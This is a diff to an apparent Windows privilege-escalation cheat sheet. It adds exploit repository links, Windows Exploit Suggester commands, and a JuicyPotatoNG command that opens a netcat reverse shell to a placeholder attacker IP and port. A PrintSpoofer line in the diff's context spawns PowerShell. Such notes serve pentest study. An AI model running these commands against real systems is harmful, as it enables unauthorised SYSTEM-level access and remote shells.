@@ -307,6 +307,10 @@ file://c:/windows/system32/cmd.exe
 
 ## Public Exploits and Security Updates
 
+> https://github.com/bitsadmin/wesng
+
+> https://github.com/SecWiki/windows-kernel-exploits
+
 ```shell
 # enumerate the system
 systeminfo
@@ -317,6 +321,14 @@ systeminfo | findstr /B /C:"KB"
 
 # find a public exploit
 searchsploit 'params'
+
+# Windows Exploit Suggester ng
+pipx install wesng
+wes --update
+wes sysinfo # copied from the windows host
+wes sysinfo -e # show only vulns with exploits
+
+# search in the above repo for usable exploits
 ```
 
 ## Registry
@@ -364,6 +376,8 @@ whoami /priv
 
 > <https://github.com/antonioCoco/JuicyPotatoNG>
 
+> <https://github.com/ohpe/juicy-potato/tree/master/CLSID>
+
 > <https://github.com/itm4n/PrintSpoofer>
 
 ```shell
@@ -376,6 +390,9 @@ Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse
 
 # JuicyPotatoNG
 JuicyPotatoNG.exe -t * -p "shell.exe" -a
+JuicyPotatoNG.exe -t * -p "cmd.exe" -a "/c nc.exe <ip> <port> -e cmd"
+# find available ports
+JuicyPotatoNG.exe -s
 
 # PrintSpoofer
 PrintSpoofer.exe -i -c powershell.exe
